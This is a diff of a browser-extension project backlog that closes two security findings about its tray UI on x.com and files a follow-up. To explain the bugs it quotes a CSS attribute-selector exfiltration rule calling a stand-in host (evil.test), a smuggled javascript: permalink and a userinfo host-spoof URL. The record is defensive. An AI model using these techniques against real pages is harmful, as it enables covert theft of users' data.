@@ -49,7 +49,8 @@ landed. **Both numbers here were corrected by the verification gate, not by noti
 | ~~49~~ | agent | ~~Four reliability holes on the path somebody is waiting on~~ **DONE 2026-08-27**, `0486712` + `b006efc`. **ALL FOUR.** R-1's comment in `licenseHandler.ts` - *"never during a catch"* - **was false from the day it was written**, which is why a missing timeout on the catch path went unnoticed. R-2's cooldown had to be PERSISTED, because an MV3 worker is torn down between catches and module scope does not survive. R-3's watchdog number is DERIVED from the pipeline's own ceilings rather than guessed, which is why this exports three of them. **25 mutations, 25 caught, 4 survived first pass** | a catch that hangs, on someone else’s page |
 | **50** | agent | **FIVE OF NINE DONE 2026-08-27**, `b08489c` + `12c9055` + `d4a96de`. **The biggest was not in the item**: the 08-27 429 fix bounded ONE of two fan-outs at the same host, and `groundText` was still firing **21 concurrent** searches - more than the nineteen that caused the outage. PERF-2 (half), PERF-4, PERF-5, PERF-7 closed with before/after numbers. **REMAINING: PERF-2's tray memo, PERF-3, PERF-8, PERF-10.** PERF-3's implied fix is a product regression - see the body | the first impression |
 | ~~51~~ | agent | **ALL NINE DONE 2026-08-27/28** — `b8b33fa` (PERF-6/SEC-4), `fa5ab8f` (SEC-3), and TM-12. **The one worth reading: `ipCap` carried a written argument for why it needed no eviction, and the argument was IPv4 reasoning beside an IPv6-capable edge** — a /64 delegation gave one caller 2^64 keys, so the brake was a no-op and the map unbounded. **NOTHING REMAINS.** All nine closed, each mutation-tested twice All re-probed and confirmed still open on 08-27 | — |
-| **52** | agent | **The tray lives in the host page's light DOM** (TM-9 exfiltration surface, TM-10 latent `javascript:`) | — |
+| ~~52~~ | agent | **BOTH FINDINGS CLOSED 2026-08-28.** TM-9's `data-sig` carried every book TITLE and pile on an attribute in x.com's light DOM, **readable by CSS attribute selectors with no script at all**; TM-10's `href*=` substring stored `javascript:` URLs on the shelf, defused by ONE render guard. **16 mutations, 16 caught** | — |
+| **61** | agent, **needs a browser** | **The tray's DOM is still readable by the page it sits on** — card text, class names, the injected `<style>`. The shadow root the review proposed needs the 110-selector stylesheet SPLIT first, because it also serves the Save button inside X's own markup, and the failure mode is visual with no way to verify it from node | item 3 |
 | **53** | agent | **Types that do not type** (TS-1/2/3/4/7). TS-7 is the flag that would have made the `activationId` bug red | every future silent-drop bug |
 | **54** | agent | **Dead code, stale comments, one edge against the graph** (M-1, M-2, M-3, X-2, X-3, X-5, X-6, D-5, D-7, D-9, K-1, five stale comments). All re-confirmed by grep on 08-25 | `README.md` currently lies |
 | **55** | agent | **The two surfaces no test can reach** (M-5 the context-menu orchestration, M-6 the whole card renderer including the paywall) | — |
@@ -1217,15 +1218,52 @@ unblocks.
         Response(` in both handlers spreads `SAFE_HEADERS`, counted, not spot-checked.
         **8 mutations, 8 caught.**
 
-- [ ] **52. THE TRAY LIVES IN THE HOST PAGE'S LIGHT DOM.** *(review §5)*
+- [x] **52. THE TRAY LIVES IN THE HOST PAGE'S LIGHT DOM.** *(review §5)* **BOTH NAMED
+      FINDINGS CLOSED 2026-08-28. The general hardening is item 61 and is NOT done.**
 
-      - **TM-9 · Stable class names in the host page's light DOM**, and `content.ts:955`
-        mirrors which pile a book is in into `el.dataset['sig']` — **a CSS-attribute
-        exfiltration surface.** Fix: closed shadow root, move `sig` to a `WeakMap`.
-      - **TM-10 · Latent `javascript:` on the shelf.** `content.ts:519` uses
-        `href*="/status/"` (substring — **the same shape as the `twimg` filter item 41 fixed**)
-        and returns `.href` verbatim. **Defused today only by `popup.ts:467`'s protocol guard
-        at the single render site**, which means a second render site re-opens it.
+      - ~~**TM-9 · `el.dataset['sig']` is a CSS-attribute exfiltration surface.**~~ **DONE**,
+        `src/extension/cardSignature.ts`. **Worse than "a signature": the string carried
+        every book TITLE, its cover URL, which pile it was already in and which pile you
+        just put it in** — on an attribute in x.com's own light DOM. **And reading it needs
+        no script:** `[data-sig^="a"] { background: url(https://evil.test/a) }`, one rule per
+        prefix, recovered from the request log. No CSP script rule applies and `realClick`'s
+        `isTrusted` gate never runs. **It never needed to be in the DOM** — its only reader
+        is a repaint check, and `drawn` already held one record per card. Moved there.
+        A mutation also found the old join COLLIDED: a title of `A///,B` produced the same
+        signature as two books "A" and "B", and a title is the one part an attacker chooses.
+      - ~~**TM-10 · Latent `javascript:` on the shelf.**~~ **DONE**,
+        `src/extension/permalink.ts`. `a[href*="/status/"]` is a substring match and `.href`
+        was returned verbatim, so `<a href="javascript:…#/status/1">` was stored as
+        `source.url`. **The same shape item 41 fixed in `isTweetMedia`, one selector along.**
+        The render guard in `popup.ts` defused it and did not make it safe — the bad URL was
+        still WRITTEN, so the safety belonged to one render site. Now checked where it is
+        READ: https only, host via `feedHost.ts`'s label-boundary rule (so
+        `https://x.com@evil.test/…` fails), `status` as a PATH SEGMENT with a numeric id.
+        It WALKS the anchors, because taking the first match let one forged anchor shadow
+        the real permalink. **16 mutations, 16 caught, twice.**
+
+- [ ] **61. THE TRAY'S DOM IS STILL READABLE BY THE PAGE IT SITS ON.** Filed 2026-08-28 out
+      of item 52, whose two NAMED findings are closed. This is the general hardening the
+      review proposed as their mechanism — *"closed shadow root"* — and it is deliberately
+      NOT done, for a reason worth reading before starting it.
+
+      **What still leaks.** The card renders book titles as TEXT, so
+      `document.querySelector('.buki-card').textContent` reads them. The `buki-` class names
+      and the injected `<style>` in `document.head` also say Buki is installed, on every page
+      a catch-anywhere injection has ever touched.
+
+      **Why it was not done in the same commit.** `content.ts`'s stylesheet has **110 `buki-`
+      references and serves TWO surfaces**: the tray, which a shadow root can contain, and the
+      **Save button injected into X's own article DOM**, which it cannot — that element lives
+      inside the host page's markup by design. So the sheet has to be split before anything
+      can be moved, and the failure mode is VISUAL, on the surface the product is named for,
+      **with no way to verify it from node.** Item 3's by-hand browser pass is the only gate,
+      and spending it on a change made blind is the wrong trade pre-launch.
+
+      **Threat model, honestly:** the attacker is a hostile script already running on x.com —
+      an ad, an injection, another extension. If X itself is hostile the tray is not the
+      problem. That is a real risk and a narrow one, which is why it is filed rather than
+      rushed.
 
 - [ ] **53. TYPES THAT DO NOT TYPE.** *(review §4 and §5)*
 
